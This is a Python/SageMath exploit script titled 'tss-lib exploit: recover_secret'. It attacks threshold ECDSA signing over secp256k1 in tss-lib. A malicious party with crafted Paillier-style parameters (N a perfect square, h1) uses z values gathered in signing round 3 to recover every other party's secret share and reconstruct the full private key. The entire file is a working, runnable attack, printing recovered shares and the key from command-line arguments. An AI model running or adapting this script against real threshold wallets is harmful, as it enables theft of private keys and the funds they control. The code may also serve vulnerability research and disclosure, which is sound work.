"""
tss-lib exploit: recover_secret

Require a python 3.10 conda environment with sagemath and pycryptodome
installed to run.
"""
import sys
from typing import Optional, List, Tuple
from sage.all import GF, EllipticCurve, product, gp, mod, isqrt
from types import SimpleNamespace
from dataclasses import dataclass

SECP256K1 = SimpleNamespace(
    p=0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f,
    q=0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141,
    Gx=0x79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798,
    Gy=0x483ada7726a3c4655da4fbfc0e1108a8fd17b448a68554199c47d08ffb10d4b8
)
SECP256K1.curve = EllipticCurve(GF(SECP256K1.p), [0, 7])
SECP256K1.G = SECP256K1.curve((SECP256K1.Gx, SECP256K1.Gy))
assert SECP256K1.G * SECP256K1.q == 0


@dataclass
class Party:
    """
    Containing party information.

    `x` is the x-coordinate of the party. `z` is the z value of Bob's range
    proof with check received from the party during round 3 of ecdsa signing.
    """
    x: int
    z: int


def recover_shares(N: int, h1: int, self_x: int, self_share: int,
                   data: List[Party]) -> Tuple[List[int], Optional[int]]:
    """
    Recover secret shares of the parties.

    `N` and `h1` are from the malicious params in use. `self_x` is the
    x-coordinate of the malicious party. `data` contains the `z` values
    collected at signing round 3. If `self_share` is specified, the final
    private key will also be reconstructed.
    """
    Fq = GF(SECP256K1.q)
    set_x = set(z.x for z in data)
    set_x.add(self_x)

    def eq_x_xi(x: int, xi: int):
        """
        Work over `Fq`, return 1 if `x == xi`, 0 if `x != xi` and `x in
        set_x`.
        """
        return product((Fq(x) - xj) / (xi - xj) for xj in set_x if xj != xi)

    p = int(isqrt(N))
    assert p ** 2 == N
    k = pow(h1, p - 1, N) - 1
    assert k % p == 0
    k //= p
    inv_k = pow(k, -1, p)

    shares = []
    for party in data:
        w = pow(party.z, p - 1, N)
        w = (w - 1) // p
        w = w * inv_k % p
        # w = gp.znlog(party.z, mod(h1, N))
        # w -= (N - 1) // 2 if w > (N - 1) // 2 else 0
        shares.append(int(Fq(w) / eq_x_xi(0, party.x)))

    if self_share is None:
        return shares, None

    secret_key = sum(eq_x_xi(0, p.x) * s for p, s in zip(data, shares))
    secret_key += eq_x_xi(0, self_x) * self_share
    return shares, int(secret_key)


if __name__ == '__main__':
    N = int(sys.argv[1])
    h1 = int(sys.argv[2])
    self_x = int(sys.argv[3])
    self_share = int(sys.argv[4])

    tmp = list(map(int, sys.argv[5:]))  # remaining xi, zi
    data = [Party(x, z) for x, z in zip(tmp[0::2], tmp[1::2])]

    shares, secret_key = recover_shares(N, h1, self_x, self_share, data)
    [print(i) for i in shares + [secret_key]]
